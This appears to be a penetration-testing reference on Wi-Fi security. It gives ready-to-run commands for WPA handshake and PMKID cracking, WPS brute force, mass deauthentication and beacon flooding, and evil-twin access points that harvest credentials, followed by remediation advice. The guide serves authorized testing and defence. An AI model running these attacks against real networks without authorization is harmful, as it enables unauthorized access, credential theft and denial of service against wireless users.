# Wireless Security Testing

## Overview
Wireless security testing evaluates the security of Wi-Fi networks and their authentication mechanisms. It covers attacks against WPA/WPA2/WPA3 protocols, WPS vulnerabilities, rogue access points, deauthentication attacks, and enterprise wireless environments. Wireless networks present a unique attack surface because they extend beyond physical boundaries, allowing attackers to probe and attack from outside the premises without requiring physical network access.

## Classification
- **CWE:** CWE-326 (Inadequate Encryption Strength), CWE-287 (Improper Authentication), CWE-311 (Missing Encryption of Sensitive Data)
- **MITRE ATT&CK:** T1557.002 (ARP Cache Poisoning), T1600 (Weaken Encryption), T1563 (Remote Service Session Hijacking), TA0001 (Initial Access via Wireless)
- **CVSS Base:** 5.0 - 9.0 (Medium to Critical, depending on network sensitivity)

## Detection Methodology

### 1. Wireless Reconnaissance
Discover and enumerate wireless networks in range:
```bash
# Set interface to monitor mode
sudo airmon-ng start wlan0

# Scan for networks
sudo airodump-ng wlan0mon

# Target specific channel
sudo airodump-ng wlan0mon -c 6

# Target specific BSSID and capture handshake
sudo airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture

# Scan with specific band
sudo airodump-ng wlan0mon --band abg    # 2.4GHz + 5GHz

# Wash (WPS-enabled networks)
wash -i wlan0mon

# Kismet (comprehensive wireless scanner)
kismet -c wlan0mon
```

### 2. WPA/WPA2 PSK Attacks

**Handshake Capture and Cracking:**
```bash
# Step 1: Start capture on target channel
sudo airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake

# Step 2: Deauthenticate a client to force reconnection
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Step 3: Wait for "WPA handshake" in airodump-ng output

# Step 4: Crack with aircrack-ng
aircrack-ng -w wordlist.txt handshake-01.cap

# Step 4 (alt): Crack with hashcat (faster with GPU)
# Convert cap to hccapx
cap2hccapx handshake-01.cap handshake.hccapx
hashcat -m 2500 handshake.hccapx wordlist.txt

# Convert cap to hash for hashcat 22000 mode
hcxpcapngtool -o hash.22000 handshake-01.cap
hashcat -m 22000 hash.22000 wordlist.txt
```

**PMKID Attack (clientless, no deauth needed):**
```bash
# Capture PMKID from AP (no handshake required)
sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2

# Convert to hashcat format
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# Crack with hashcat
hashcat -m 22000 pmkid.22000 wordlist.txt

# Alternative: using hcxtools
hcxdumptool -i wlan0mon -o dump.pcapng
hcxpcapngtool -o hash.22000 dump.pcapng
hashcat -m 22000 hash.22000 wordlist.txt -r rules/best64.rule
```

### 3. WPS Attacks
```bash
# Enumerate WPS-enabled networks
wash -i wlan0mon

# Reaver (WPS PIN brute force)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Reaver with Pixie Dust (offline WPS attack)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv

# Bully (alternative WPS brute force)
bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Bully with Pixie Dust
bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
```

### 4. WPA3 / SAE Attacks
```bash
# Dragonblood attacks (CVE-2019-9494, CVE-2019-9496)
# Side-channel attack against SAE handshake

# Dragonslayer (SAE authentication bypass)
# dragonslayer requires patched wpa_supplicant

# Downgrade attack: force WPA2 fallback if transition mode enabled
# Monitor for WPA3-SAE networks operating in transition mode
# Target WPA2 fallback with standard handshake capture

# Timing-based side-channel
# Analyze SAE commit message timing to determine password group
```

### 5. Deauthentication Attacks
```bash
# Deauth all clients from AP
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth specific client
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# mdk4 (mass deauth and chaos)
mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF        # Deauth specific AP
mdk4 wlan0mon d                                # Deauth all
mdk4 wlan0mon b -c 6                          # Beacon flood on channel 6
mdk4 wlan0mon a -m                             # Authentication DoS

# bettercap WiFi deauth
bettercap -iface wlan0mon
> wifi.recon on
> wifi.deauth AA:BB:CC:DD:EE:FF
```

### 6. Evil Twin / Rogue Access Point
```bash
# hostapd-wpe (evil twin with credential capture)
# Configure hostapd-wpe.conf:
#   interface=wlan0
#   ssid=TargetNetwork
#   channel=6
#   hw_mode=g
hostapd-wpe hostapd-wpe.conf

# Fluxion (automated evil twin framework)
fluxion

# EAPHammer (WPA-Enterprise evil twin)
eaphammer --bssid AA:BB:CC:DD:EE:FF --essid "CorpWiFi" --channel 6 --interface wlan0 --auth wpa-eap --creds

# Manual evil twin setup:
# 1. Create AP
hostapd evil_ap.conf
# 2. Set up DHCP
dnsmasq -C dnsmasq.conf
# 3. Enable NAT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
# 4. Redirect DNS to captive portal
# 5. Serve credential-harvesting page
```

### 7. WPA-Enterprise Attacks
```bash
# Capture EAP identity and challenge/response
sudo airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w enterprise_capture

# EAPHammer (evil twin for enterprise)
eaphammer --bssid AA:BB:CC:DD:EE:FF --essid "CorpWiFi" --channel 6 --interface wlan0 --auth wpa-eap --creds

# hostapd-wpe (capture MSCHAPv2 credentials)
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Captured credentials appear in hostapd-wpe log
# Crack with asleap:
asleap -C challenge -R response -W wordlist.txt

# Crack MSCHAPv2 with hashcat
hashcat -m 5500 mschapv2_hash.txt wordlist.txt
```

### 8. Wireless Client Attacks
```bash
# Karma attack (respond to all probe requests)
# Clients probing for previously connected networks will connect to attacker
hostapd-wpe hostapd-wpe.conf  # With karma patches

# Known beacons attack
# Broadcast beacons for common SSIDs (hotel WiFi, airport, etc.)
mdk4 wlan0mon b -f common_ssids.txt

# MANA (improved Karma)
# Respond selectively to probe requests matching specific SSIDs
```

## Tool Usage

### aircrack-ng Suite
```bash
# Monitor mode management
airmon-ng check kill         # Kill interfering processes
airmon-ng start wlan0        # Start monitor mode
airmon-ng stop wlan0mon      # Stop monitor mode

# Packet injection test
aireplay-ng -9 wlan0mon

# Crack WEP (legacy)
aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap
```

### WiFite2 (Automated Wireless Auditing)
```bash
# Scan and attack all nearby networks
wifite

# Target specific encryption
wifite --wpa --wps

# Use specific wordlist
wifite --dict wordlist.txt

# Attack specific target
wifite --bssid AA:BB:CC:DD:EE:FF
```

### bettercap WiFi Module
```bash
bettercap -iface wlan0mon
> wifi.recon on               # Scan for networks
> wifi.show                   # Display results
> wifi.deauth AA:BB:CC:DD:EE:FF   # Deauth target
> wifi.assoc AA:BB:CC:DD:EE:FF    # Associate to network
```

## Remediation
1. **Use WPA3-SAE** -- upgrade to WPA3 where supported, disable WPA2 fallback in non-transition mode
2. **Strong pre-shared keys** -- use 20+ character random passphrases for WPA2-PSK
3. **Disable WPS** -- WPS PIN is fundamentally flawed, disable on all access points
4. **WPA-Enterprise with EAP-TLS** -- use certificate-based authentication instead of MSCHAPv2
5. **802.11w (Management Frame Protection)** -- enable MFP/PMF to prevent deauthentication attacks
6. **Rogue AP detection** -- deploy wireless IDS/IPS (WIDS/WIPS) to detect evil twins
7. **Client isolation** -- enable AP isolation to prevent client-to-client attacks
8. **SSID management** -- do not use hidden SSIDs (security through obscurity, causes client probing)
9. **Certificate validation** -- configure clients to verify server certificates for enterprise auth
10. **Network segmentation** -- place wireless on a separate VLAN with firewall controls

## Evidence Collection
When documenting wireless security findings:
- List of wireless networks discovered with encryption types and channels
- Captured handshake files (pcap) with redacted credentials
- WPS PIN results or Pixie Dust attack output
- Screenshots of evil twin portal and captured credentials (sanitized)
- Deauthentication attack impact and duration
- Client probe requests captured revealing network history
- Access point configuration weaknesses identified
- Physical location and signal strength mapping
